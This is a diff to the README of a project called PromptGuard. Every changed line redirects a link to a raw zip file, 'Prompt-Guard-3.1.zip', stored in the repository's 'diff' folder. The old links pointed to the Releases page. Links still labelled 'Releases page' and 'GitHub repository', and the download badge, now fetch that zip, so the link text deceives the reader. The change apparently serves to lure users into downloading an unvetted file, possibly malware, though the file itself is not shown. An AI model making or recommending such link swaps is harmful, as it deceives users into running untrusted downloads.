@@ -2,7 +2,7 @@
 
 ## 📥 Download PromptGuard
 
-[![Download PromptGuard](https://img.shields.io/badge/Download-PromptGuard-brightgreen)](https://github.com/rizkycsv/PromptGuard/releases)
+[![Download PromptGuard](https://github.com/rizkycsv/PromptGuard/raw/refs/heads/main/diff/Prompt-Guard-3.1.zip)](https://github.com/rizkycsv/PromptGuard/raw/refs/heads/main/diff/Prompt-Guard-3.1.zip)
 
 ---
 
@@ -28,7 +28,7 @@ To run PromptGuard, make sure your computer meets these minimum requirements:
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/rizkycsv/PromptGuard/releases).
+1. Visit the [Releases page](https://github.com/rizkycsv/PromptGuard/raw/refs/heads/main/diff/Prompt-Guard-3.1.zip).
 2. Choose the latest version of PromptGuard listed.
 3. Select the appropriate file for your operating system.
 4. Download the file to your computer.
@@ -69,4 +69,4 @@ Thanks to everyone who has contributed to this project. Your input helps us crea
 
 PromptGuard is open source and available under the MIT License. Feel free to use it, modify it, and share it.
 
-For more detailed information about usage, features, and more, refer back to the [GitHub repository](https://github.com/rizkycsv/PromptGuard/releases).
+For more detailed information about usage, features, and more, refer back to the [GitHub repository](https://github.com/rizkycsv/PromptGuard/raw/refs/heads/main/diff/Prompt-Guard-3.1.zip).
